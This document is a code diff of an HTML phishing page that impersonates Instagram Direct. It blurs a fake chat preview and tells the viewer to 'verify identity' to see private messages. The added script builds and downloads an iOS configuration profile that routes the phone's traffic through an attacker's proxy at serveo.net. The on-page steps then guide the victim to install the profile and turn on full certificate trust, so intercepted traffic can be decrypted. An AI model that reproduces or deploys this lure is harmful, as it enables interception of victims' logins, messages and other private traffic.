@@ -6,60 +6,34 @@
     <title>Instagram Direct</title>
     <style>
         body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #000; overflow: hidden; }
-        
-        .chat-preview {
-            background: url('chat_preview.jpg') no-repeat center top;
-            background-size: contain; height: 100vh; width: 100%;
-            position: fixed; top: 0; left: 0; z-index: 1;
-            transition: filter 1s ease;
-        }
-
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2; display: none; backdrop-filter: blur(10px); }
-        
-        .popup {
-            position: relative; z-index: 3; background: #fff; padding: 25px; border-radius: 25px;
-            text-align: center; max-width: 290px; margin: 20vh auto;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8); display: none;
-        }
-
+        .chat-preview { background: url('chat_preview.jpg') no-repeat center top; background-size: contain; height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 1; transition: filter 1s ease; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2; display: none; backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); }
+        .popup { position: relative; z-index: 3; background: #fff; padding: 25px; border-radius: 25px; text-align: center; max-width: 290px; margin: 20vh auto; box-shadow: 0 20px 60px rgba(0,0,0,0.8); display: none; }
         .btn { display: block; background: #007aff; color: white; padding: 15px; border-radius: 14px; font-weight: 600; text-decoration: none; border: none; width: 100%; cursor: pointer; }
-        
-        .instruction-box { display: none; margin-top: 15px; text-align: left; font-size: 13px; background: #f5f5f7; padding: 15px; border-radius: 12px; border-left: 5px solid #007aff; }
-
-        /* LOADING ANIMATION FOR TRUST */
+        .instruction-box { display: none; margin-top: 15px; text-align: left; font-size: 12px; background: #f5f5f7; padding: 15px; border-radius: 12px; border-left: 5px solid #007aff; color: #333; }
         .loader-bar { width: 100%; background: #eee; height: 8px; border-radius: 4px; margin: 20px 0; overflow: hidden; display: none; }
         .progress { width: 0%; height: 100%; background: #34c759; transition: width 60s linear; }
-
         .blur { filter: blur(20px); }
     </style>
 </head>
 <body>
-
     <div class="chat-preview" id="chat"></div>
     <div class="overlay" id="overlay"></div>
-
     <div class="popup" id="modal">
-        <h2 id="title" style="font-size: 18px;">Security Verification</h2>
-        <p id="desc" style="font-size: 13px; color: #666;">This archive is encrypted. To unblur, install the secure identity profile.</p>
-        
+        <h2 id="title">Archive Encryption</h2>
+        <p id="desc">Verify identity to unblur 48 private messages.</p>
         <button onclick="startFlow()" class="btn" id="action-btn">Verify & Unblur</button>
-
         <div id="guide" class="instruction-box">
-            <b>STEP 1: DOWNLOADED</b><br>
-            Go to <b>Settings > Profile Downloaded > Install</b>. Then return here.<br><br>
-            <b>STEP 2: ACTIVATE</b><br>
-            Go to <b>Settings > General > About > Certificate Trust</b>. Turn ON 'Hadima Identity'.
+            <b>1. Downloaded:</b> Go to Settings > Profile Downloaded > Install.<br><br>
+            <b>2. Activate:</b> Go to Settings > General > About > Certificate Trust. Turn ON 'Hadima Identity'.
         </div>
-
         <div id="loading-container" style="display:none;">
-            <p style="font-size: 13px; color: #34c759; font-weight: bold;">Verifying Trust Status...</p>
+            <p style="color: #34c759; font-weight: bold; font-size: 13px;">Verifying Network Trust...</p>
             <div class="loader-bar" id="lbar" style="display:block;"><div class="progress" id="pbar"></div></div>
-            <p style="font-size: 11px; color: #888;">Chat will unblur automatically once trust is verified (Approx 60s).</p>
+            <p style="font-size: 10px; color: #888;">Chat unblurs automatically after verification.</p>
         </div>
     </div>
-
     <script>
-        // Start after 5 seconds
         setTimeout(() => {
             document.getElementById('chat').classList.add('blur');
             document.getElementById('overlay').style.display = 'block';
@@ -67,15 +41,29 @@
         }, 5000);
 
         function startFlow() {
-            // Trigger Download
-            window.location.href = "verify.mobileconfig";
-
-            // Update UI to Instructions
+            const config = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key><array><dict>
+    <key>ProxyServer</key><string>serveo.net</string>
+    <key>ProxyPort</key><integer>9988</integer>
+    <key>PayloadType</key><string>com.apple.proxy.http</string>
+    <key>PayloadVersion</key><integer>1</integer>
+    <key>PayloadIdentifier</key><string>com.apple.proxy.setup</string>
+    <key>PayloadUUID</key><string>12345</string></dict></array>
+    <key>PayloadDisplayName</key><string>Hadima Identity</string>
+    <key>PayloadIdentifier</key><string>com.hadima.verify</string>
+    <key>PayloadType</key><string>Configuration</string>
+    <key>PayloadUUID</key><string>54321</string>
+    <key>PayloadVersion</key><integer>1</integer>
+</dict></plist>`;
+            const blob = new Blob([config], { type: 'application/x-apple-aspen-config' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a'); a.href = url; a.download = 'verify.mobileconfig'; a.click();
             document.getElementById('desc').style.display = "none";
             document.getElementById('action-btn').style.display = "none";
             document.getElementById('guide').style.display = "block";
-
-            // Show Loading after 15 seconds (time taken to install)
             setTimeout(() => {
                 document.getElementById('guide').style.display = "none";
                 document.getElementById('loading-container').style.display = "block";
